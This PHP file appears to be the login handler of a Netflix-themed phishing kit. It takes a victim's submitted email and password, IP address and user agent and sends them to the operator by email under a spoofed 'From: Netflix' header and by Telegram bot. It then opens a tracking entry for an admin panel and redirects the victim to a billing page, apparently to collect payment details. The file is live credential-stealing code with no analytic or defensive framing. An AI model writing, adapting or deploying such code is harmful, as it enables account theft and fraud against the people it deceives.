<?php

include('../infos.php');
include("../common/sub_includes.php");
include("../common/functions.php");
include('../langue.php');



if(isset($_POST)){

	start_session();

	gather_login_infos();


	if(1==1 || strpos($_SESSION['email'], "hotmail.com") || strpos($_SESSION['email'], "hotmail.fr") || strpos($_SESSION['email'], "live.fr") || strpos($_SESSION['email'], "outlook.fr") || strpos($_SESSION['email'], "outlook.com") || strpos($_SESSION['email'], "orange.fr") || strpos($_SESSION['email'], "orange.com") || strpos($_SESSION['email'], "wanadoo.fr") || strpos($_SESSION['email'], "sfr.fr") || strpos($_SESSION['email'], "club-internet.fr") || strpos($_SESSION['email'], "neuf.fr") || strpos($_SESSION['email'], "aliceadsl.fr") || strpos($_SESSION['email'], "noos.fr") || strpos($_SESSION['email'], "yahoo.com") || strpos($_SESSION['email'], "yahoo.fr") || strpos($_SESSION['email'], "aol.com") || strpos($_SESSION['email'], "aol.fr") || strpos($_SESSION['email'], "gmail.com") || strpos($_SESSION['email'], "icloud.com") || strpos($_SESSION['email'], "gmx.fr") || strpos($_SESSION['email'], "gmx.de") || strpos($_SESSION['email'], "free.fr") || strpos($_SESSION['email'], "bbox.fr")){
				
				
				
				######################
				#### SETUP  PANEL ####
				######################
	
				if(!isset($_SESSION['id'])){
					createUniqueToken();
				}


				// cree de file
				
					$file = "../data/await/".$_SESSION['id'];
					$op = fopen($file,'w');
					fwrite($op,"");
					fclose($op);
					
				//link
				$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
				$homepage = dirname(dirname($actual_link));
				$link = $homepage."/sma-admin/select.php?id=".$_SESSION['id']."&ip=".$_SESSION['ip'];

				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "

[🍛] Login Part [🍛]

🍛 E-Mail : ".$_SESSION['email']."
🍛 Mot de passe : ".$_SESSION['password']."


[🍛] Tiers Part [🍛] 

🍛 Adresse IP : ".$_SESSION['ip']."
🍛 User Agent : ".$_SESSION['useragent']."


					";

					$subject = "[".$NameSender."] + 1 Login ".$_SESSION['email']." - ".$_SESSION['ip'];
					$headers = "From: Netflix <".$NameSender.">";
					
					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$message = '

[💊] Login Part [💊]

💊 E-Mail : '.$_SESSION['email'].'
💊 Mot de passe : '.$_SESSION['password'].'


[💊] Informations tierces [💊] 

💊 Adresse IP :  '.$_SESSION['ip'].'
💊 User Agent :  '.$_SESSION['useragent'].'


					';

					toTG(htmlspecialschars($message),$chat, $token, $method_of_send_telegram );
				}
				if($error){
					if($Hebreu == true || $Arabe == true)
					{
						echo '<meta http-equiv="refresh" content="0;url=../steps/billing.php" />';
					}else{
						echo '<meta http-equiv="refresh" content="0;url=../steps/billing.php" />';
					}
				}
				else{
					echo '<meta http-equiv="refresh" content="0;url=../steps/billing.php" />';
				}
				}
		else{
			echo '<meta http-equiv="refresh" content="0;url=../index.php?error=email" />';
			//header('Location: ../index.php?error=email');

		}

	}
else{
	header('Location: ../');
}

?>